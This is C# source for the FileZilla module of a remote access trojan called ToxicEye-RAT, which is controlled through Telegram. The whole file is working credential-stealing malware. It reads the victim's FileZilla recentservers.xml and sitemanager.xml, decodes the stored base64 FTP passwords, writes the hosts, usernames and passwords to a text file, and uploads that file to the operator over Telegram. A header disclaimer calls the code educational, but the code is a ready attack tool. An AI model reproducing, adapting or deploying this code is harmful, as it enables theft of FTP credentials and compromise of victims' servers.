/* 
       ^ Author    : LimerBoy
       ^ Name      : ToxicEye-RAT
       ^ Github    : https://github.com/LimerBoy

       > This program is distributed for educational purposes only.
*/

using System;
using System.IO;
using System.Xml;
using System.Text;

namespace TelegramRAT
{
    internal class FileZilla
    {
        public static void get()
        {
            // Path info
            string FileZillaPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
            string SiteManagerPath = FileZillaPath + "sitemanager.xml";
            string RecentServersPath = FileZillaPath + "recentservers.xml";

            // Database
            string filename = "filezilla.txt";
            string output = "[FILEZILLA SERVERS]\n\n";

            // If not installed
            if (!Directory.Exists(FileZillaPath))
            {
                telegram.sendText("🛠 FileZilla not installed");
                return;
            }

            // Get data from recentserver.xml
            if (File.Exists(RecentServersPath))
            {
                try
                {
                    XmlDocument doc = new XmlDocument();
                    doc.Load(RecentServersPath);
                    foreach (XmlNode node in doc.GetElementsByTagName("Server"))
                    {
                        // Get values
                        string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
                        string username = node["User"].InnerText;
                        string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
                        // Add
                        output += "URL: " + url + "\n"
                               + "USERNAME: " + username + "\n"
                               + "PASSWORD: " + password + "\n"
                               + "\n";
                    }
                } catch {
                    telegram.sendText("⛔ Failed to read recentserver.xml");
                }
            }
            // Get data from sitemanager.xml
            if (File.Exists(SiteManagerPath))
            {
                try
                {
                    XmlDocument doc = new XmlDocument();
                    doc.Load(SiteManagerPath);
                    foreach (XmlNode node in doc.GetElementsByTagName("Server"))
                    {
                        // Get values
                        string url = "ftp://" + node["Host"].InnerText + ":" + node["Port"].InnerText + "/";
                        string username = node["User"].InnerText;
                        string password = Encoding.UTF8.GetString(Convert.FromBase64String(node["Pass"].InnerText));
                        // Add
                        output += "URL: " + url + "\n"
                               + "USERNAME: " + username + "\n"
                               + "PASSWORD: " + password + "\n"
                               + "\n";
                    }
                } catch
                {
                    telegram.sendText("⛔ Failed to read sitemanager.xml");
                }
                
            }
            // Send
            File.WriteAllText(filename, output);
            telegram.UploadFile(filename, true);
        }
    }
}
